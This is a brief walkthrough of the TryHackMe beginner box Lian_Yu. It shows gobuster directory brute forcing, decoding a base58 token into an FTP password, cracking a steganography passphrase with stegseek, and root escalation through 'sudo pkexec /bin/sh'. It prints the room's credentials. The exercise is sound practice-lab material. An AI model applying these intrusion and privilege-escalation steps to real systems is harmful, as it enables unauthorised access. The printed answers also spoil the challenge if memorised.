---
title: Walkthrough - Lian_Yu
published: true
---

Welcome to Lian_YU, this Arrowverse themed beginner CTF box!

Challenge/Gobuster/Steganography/Priv-Esc

[https://tryhackme.com/room/lianyu](https://tryhackme.com/room/lianyu)

* * *

## What is the Web Directory you found?

- ``gobuster dir -u http://10.10.251.212/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php -t 100 --no-error``

* * *

## what is the file name you found?

- Looking at the source code of ``/island/2100/`` give us a posslbe clue... ``you can avail your .ticket here but how?``
- we also have another clue ``vigilante`` from ``view-source:http://10.10.251.212/island/``
- running ``gobuster dir -u http://10.10.251.212/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket -t 100 --no-error`` can find ``/green_arrow.ticket``

```shell
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```

* * *

## what is the FTP Password?

- decode from base58 to get the password ``!#th3h00d`` which we can then login to ftp with username ``vigilante``

* * *

## what is the file name with SSH password?

- login to ftp with the credentials and ``mget *``
- ``stegseek aa.jpg /usr/share/wordlists/rockyou.txt``
- ``7z x aa.jpg.out``
- ``cat shado`` we get ``M3tahuman``
- ``cd ..`` in the ftp we get another user ``slade`` that we should be able to login to ssh with.

* * *

## user.txt

- ``cat user.txt``

* * *

## root.txt

```shell
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

- ``sudo pkexec /bin/sh``
- ``cat /root/root.txt``



* * * 